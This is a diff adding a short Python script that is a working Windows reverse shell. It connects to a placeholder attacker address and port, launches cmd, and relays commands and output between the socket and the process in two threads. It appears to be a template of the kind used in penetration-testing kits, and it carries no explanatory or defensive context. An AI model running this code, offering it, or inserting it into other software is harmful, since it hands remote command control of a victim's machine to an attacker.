@@ -1,0 +1,40 @@
+import os
+import socket
+import subprocess
+import threading
+
+def s2p(s, p):
+    """Send data from socket to process"""
+    while True:
+        data = s.recv(1024)
+        if len(data) > 0:
+            p.stdin.write(data)
+            p.stdin.flush()
+
+def p2s(s, p):
+    """Send process output to socket"""
+    while True:
+        s.send(p.stdout.read(1))
+
+# Create and connect socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("__IPADDR__", __PORT__))
+
+# Start subprocess with cmd
+p = subprocess.Popen(
+    ["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE
+)
+
+# Start threads to handle bidirectional communication
+s2p_thread = threading.Thread(target=s2p, args=(s, p), daemon=True)
+s2p_thread.start()
+
+p2s_thread = threading.Thread(target=p2s, args=(s, p), daemon=True)
+p2s_thread.start()
+
+# Wait for process to terminate
+try:
+    p.wait()
+except KeyboardInterrupt:
+    s.close()
+
